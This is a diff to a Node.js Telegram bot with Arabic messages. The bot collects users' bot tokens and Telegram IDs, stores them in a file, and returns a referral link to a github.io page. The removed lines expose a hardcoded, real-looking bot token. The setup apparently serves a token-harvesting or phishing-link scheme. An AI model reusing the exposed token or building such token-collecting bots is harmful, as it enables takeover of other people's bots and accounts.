@@ -1,7 +1,8 @@
 import { Telegraf } from 'telegraf';
 import fs from 'fs';
+import http from 'http';
 
-const mainBot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4');
+const mainBot = new Telegraf('توكن_البوت_هنا');
 
 function loadUsers() {
   try {
@@ -18,34 +19,32 @@ function saveUsers(users) {
 const users = loadUsers();
 
 mainBot.start((ctx) => {
-  ctx.reply('👋 أهلاً بك، ما هو اسمك؟ 🤔');
+  ctx.reply('👋 أهلاً بك! ما هو اسمك؟ 🤔');
 });
 
 mainBot.on('text', (ctx) => {
   const chatId = ctx.chat.id.toString();
   const text = ctx.message.text;
   
-  if (!users[chatId]) users[chatId] = {};
-  
-  if (!users[chatId].token && text.includes(':')) {
-    users[chatId].token = text;
-    ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
-    saveUsers(users);
-  } else if (!users[chatId].id && /^\d{9,}$/.test(text)) {
-    users[chatId].id = text;
-    ctx.reply(`✅ تم الحفظ بنجاح!
-📎 رابطك الخاص:
+  if (!users[chatId]) {
+    if (/^\d{9,}$/.test(text) || text.includes(':')) {
+      if (!users[chatId]) users[chatId] = {};
+      if (!users[chatId].token && text.includes(':')) {
+        users[chatId].token = text;
+        ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
+      } else if (!users[chatId].id && /^\d{9,}$/.test(text)) {
+        users[chatId].id = text;
+        ctx.reply(`✅ تم الحفظ!
+رابطك الخاص:
 https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
-    saveUsers(users);
-  } else if (!users[chatId].token || !users[chatId].id) {
-    ctx.reply('⚠️ أرسل التوكن (Token) أو الـ ID فقط.');
-  } else {
-    ctx.reply('✅ بياناتك مسجلة مسبقًا.');
+        saveUsers(users);
+      }
+    }
   }
 });
 
 mainBot.launch();
-console.log('🤖 البوت شغّال بنجاح!');
+console.log('🤖 تم تشغيل البوت!');
 
-// (اختياري): يمنع Render من إيقاف الخدمة
-setInterval(() => {}, 1000);
+// تحايل لفتح منفذ وهمي لتجنب خطأ Render
+http.createServer(() => {}).listen(process.env.PORT || 3000);
